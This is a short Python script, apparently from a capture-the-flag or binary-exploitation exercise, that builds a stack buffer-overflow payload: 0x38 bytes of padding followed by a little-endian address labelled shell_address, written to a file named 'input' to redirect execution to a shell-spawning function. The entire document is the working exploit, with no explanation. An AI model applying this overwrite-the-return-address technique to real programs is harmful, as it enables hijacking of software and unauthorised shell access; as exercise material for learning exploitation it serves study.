shell_address = 0x0000555555555215

payload = b"a" * 0x38
payload += (shell_address).to_bytes(8,"little")
payload += b"\n"
with open("input", "wb") as output_file:
    output_file.write(payload)
